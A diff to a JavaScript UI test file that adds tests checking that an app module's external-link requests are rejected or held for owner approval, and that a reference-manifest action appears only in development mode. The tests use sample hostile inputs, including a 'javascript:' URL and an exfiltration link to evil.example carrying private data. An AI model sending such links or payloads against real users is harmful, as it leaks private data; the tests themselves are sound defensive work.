@@ -77,7 +77,7 @@ async function until(predicate) {
   assert.fail('UI state did not settle');
 }
 let harnessCount=0;
-async function harness(path='/app/overview', update={status:'not_checked',discovery_supported:false}, capabilities=[]) {
+async function harness(path='/app/overview', update={status:'not_checked',discovery_supported:false}, capabilities=[], systemExtra={}) {
   const dom = new JSDOM(html, {url:'http://localhost:12333'+path});
   const names=['window','document','location','history','fetch','CSS','getComputedStyle'];
   const saved=Object.fromEntries(names.map(name=>[name,globalThis[name]]));
@@ -97,7 +97,7 @@ async function harness(path='/app/overview', update={status:'not_checked',discov
     let data;
     if(url==='/api/v1/setup')data={required:false};
     else if(url==='/api/v1/auth/session')data={username:'owner',csrf:'test-token'};
-    else if(url==='/api/v1/system')data={name:'Test installation',version:'0.1.1',data_free_bytes:1024,protocol:1,update};
+    else if(url==='/api/v1/system')data={name:'Test installation',version:'0.1.1',data_free_bytes:1024,protocol:1,update,...systemExtra};
     else if(url==='/api/v1/modules')data=modules;
     else if(url==='/api/v1/notifications')data=records;
     else if(url==='/api/v1/notifications/read'){records[0].read=1;data={ok:true};}
@@ -202,5 +202,59 @@ test('uninstall review states that persistent module data is retained, not delet
     await until(()=>document.querySelector('[data-module-id="test-module"]'));
     [...document.querySelectorAll('[data-module-id="test-module"] button')].find(b=>b.textContent==='Uninstall').click();
     assert.match(document.querySelector('#dialog').textContent,/declares no persistent storage/);
+  } finally {h.close();}
+});
+
+test('bridge external links open only after owner approval of the exact address', async()=>{
+  const h=await harness('/app/modules/test-module',undefined,['ui.application']);
+  try {
+    await until(()=>document.querySelector('#module-application'));
+    const frame=document.querySelector('#module-application');
+    const opened=[], replies=[];
+    window.open=(...args)=>{opened.push(args);return null;};
+    frame.contentWindow.postMessage=data=>replies.push(data);
+    const send=(id,url)=>window.dispatchEvent(new window.MessageEvent('message',{data:{channel:'empyrean-v1',id,action:'external',url},source:frame.contentWindow}));
+    const reply=id=>replies.find(r=>r.id===id);
+    const exfil='https://evil.example/collect?notes=private%20data#more';
+    for (const [id,url] of [['bad1','javascript:alert(1)'],['bad2','https://user:pw@evil.example/'],['bad3','data:text/html,x'],['bad4','https://evil.example/?'+'a'.repeat(3000)],['bad5','/relative']]) {
+      send(id,url); await until(()=>reply(id));
+      assert.ok(reply(id).error, id); assert.equal(document.querySelector('#dialog').open,false);
+    }
+    send('ask',exfil);
+    await until(()=>document.querySelector('#external-actions'));
+    assert.equal(opened.length,0);
+    assert.equal(document.querySelector('#external-destination').textContent,'evil.example');
+    assert.equal(document.querySelector('#external-url').textContent,exfil);
+    assert.match(document.querySelector('#dialog').textContent,/query or fragment data/);
+    const [cancel,open]=document.querySelectorAll('#external-actions button');
+    assert.equal(open.disabled,true);
+    open.click();
+    assert.equal(opened.length,0);
+    // A second request cannot replace the pending decision.
+    send('queued',exfil); await until(()=>reply('queued'));
+    assert.match(reply('queued').error,/waiting/);
+    cancel.click();
+    await until(()=>reply('ask'));
+    assert.match(reply('ask').error,/not opened/); assert.equal(opened.length,0);
+    send('approve',exfil);
+    await until(()=>document.querySelector('#external-actions'));
+    await new Promise(resolve=>realTimeout(resolve,700));
+    document.querySelectorAll('#external-actions button')[1].click();
+    await until(()=>reply('approve'));
+    assert.deepEqual(reply('approve').result,{opened:true});
+    assert.deepEqual(opened,[[exfil,'_blank','noopener,noreferrer']]);
+  } finally {h.close();}
+});
+
+test('reference manifest loading is a development-only action', async()=>{
+  let h=await harness('/app/modules');
+  try {
+    document.querySelector('#heading-action button.primary').click();
+    assert.equal([...document.querySelectorAll('#dialog button')].some(b=>b.textContent==='Load reference manifest'),false);
+  } finally {h.close();}
+  h=await harness('/app/modules',undefined,[],{development:{reference_module:true}});
+  try {
+    document.querySelector('#heading-action button.primary').click();
+    assert.ok([...document.querySelectorAll('#dialog button')].some(b=>b.textContent==='Load reference manifest'));
   } finally {h.close();}
 });
